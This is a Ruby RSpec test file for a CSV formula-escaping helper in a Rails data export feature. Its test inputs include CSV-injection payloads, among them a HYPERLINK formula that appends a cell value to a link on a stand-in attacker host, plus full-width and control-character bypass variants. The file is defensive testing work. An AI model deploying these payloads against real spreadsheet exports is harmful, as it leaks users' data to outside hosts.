# frozen_string_literal: true

require "rails_helper"

RSpec.describe DataExports::Csv::FormulaEscaper do
  describe ".escape" do
    [
      "=1+1",
      "+1+1",
      "-1+SUM(A1)",
      "@SUM(1)",
      "=HYPERLINK(\"https://attacker.example/?c\"&A1,\"Open invoice\")",
      "\tcmd",
      "\rcmd",
      "\ncmd",
      "\t=1+1",
      "\n=HYPERLINK(\"https://attacker.example\")",
      "  @SUM(1)",
      " =1+1",
      "\u0000=1+1",
      "＝1+1",
      "＋1",
      "－1",
      "＠SUM(1)",
      "-150\n",
      "--1"
    ].each do |value|
      it "escapes #{value.inspect}" do
        expect(described_class.escape(value)).to eq("'#{value}")
      end
    end

    ["-150", "-1.5", "+42", "150", "0.5", "1-2", "foo=bar", "a@b.com", "customer name", "", " "].each do |value|
      it "keeps #{value.inspect}" do
        expect(described_class.escape(value)).to eq(value)
      end
    end

    it "keeps non string values" do
      expect(described_class.escape(nil)).to be_nil
      expect(described_class.escape(-150)).to eq(-150)
      expect(described_class.escape(BigDecimal("-1.5"))).to eq(BigDecimal("-1.5"))
      expect(described_class.escape(false)).to be(false)
    end
  end
end
